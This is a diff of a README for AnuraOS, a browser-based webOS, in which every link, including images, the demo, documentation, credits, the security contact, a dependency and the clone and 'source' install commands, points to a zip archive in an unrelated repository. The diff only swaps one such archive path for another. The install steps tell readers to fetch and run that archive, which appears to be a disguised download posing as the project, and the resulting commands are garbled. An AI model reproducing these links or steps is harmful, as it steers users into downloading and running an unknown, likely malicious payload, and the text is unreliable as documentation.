@@ -1,5 +1,5 @@
-![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip)
-![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip)
+![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)
+![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)
 
 The next-gen webOS and development environment with full Linux emulation.
 
@@ -7,15 +7,15 @@ The next-gen webOS and development environment with full Linux emulation.
 
 ## What is AnuraOS?
 
-An entirely local browser-based "OS" and development environment with complete graphical Linux emulation, visually based on ChromiumOS. See a demo [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip), fully in your browser.
+An entirely local browser-based "OS" and development environment with complete graphical Linux emulation, visually based on ChromiumOS. See a demo [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip), fully in your browser.
 
 > [!WARNING]  
-> Anura mainly targets Chromium but should work on most browsers. For a list of known browser specific quirks check [this document](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip).
+> Anura mainly targets Chromium but should work on most browsers. For a list of known browser specific quirks check [this document](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).
 
 Anura uses the features of a PWA (Progressive Web App) to make its environment work fully offline, providing a virtual filesystem (synced with the Linux emulator), a code editor, and a modular and extensible app system. You can even edit Anura's code live while inside of it!
 
 Anura shows as more of a proof-of-concept with what's possible on the modern web rather than an actual product. However, it proves useful in many actual cases and is a useful educational tool.
-![](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip)
+![](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)
 
 ## Development
 
@@ -24,7 +24,7 @@ Anura shows as more of a proof-of-concept with what's possible on the modern web
 
 ### Easy Install for GitHub Codespaces
 
-- Run `source https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip`
+- Run `source https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip`
 
 > [!NOTE]
 >
@@ -33,7 +33,7 @@ Anura shows as more of a proof-of-concept with what's possible on the modern web
 
 ### Dependencies
 
-- Recent versions of `https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip` and `npm`
+- Recent versions of `https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip` and `npm`
 - `wget`
 - A recent version of `java` (11+)
 - `inotifytools`
@@ -53,7 +53,7 @@ Anura shows as more of a proof-of-concept with what's possible on the modern web
 
 #### Building
 
-- Clone the repository with `git clone --recursive https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip`
+- Clone the repository with `git clone --recursive https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip`
 - Then, `make all`
 
 > [!TIP]
@@ -79,18 +79,18 @@ Anura should now be running at `localhost:8000`.
 
 App development is highly encouraged! Good apps can even be added to the official app repositories after review by an AnuraOS maintainer. Apps are stored in .app files which are read by AnuraOS to provide you, well, an app!
 
-For more information about developing an AnuraOS app please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip) and for using Anura API's in your code, please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip).
+For more information about developing an AnuraOS app please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) and for using Anura API's in your code, please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).
 
 ## Documentation
 
-See the current index of documentation [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip).
+See the current index of documentation [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).
 
 ## Security
 
-See [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip) for reporting instructions.
+See [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) for reporting instructions.
 
 ## Credits
 
-AnuraOS is created by [Mercury Workshop](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip). Linux emulation is based off of the [v86](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip) project. For more credits, see [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip).
+AnuraOS is created by [Mercury Workshop](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip). Linux emulation is based off of the [v86](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) project. For more credits, see [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).
 
-(p.s. for hackers: the entrypoint to anura is [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/public/assets/wallpaper/bundled_wallpapers/Software_v2.3.zip))
+(p.s. for hackers: the entrypoint to anura is [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip))
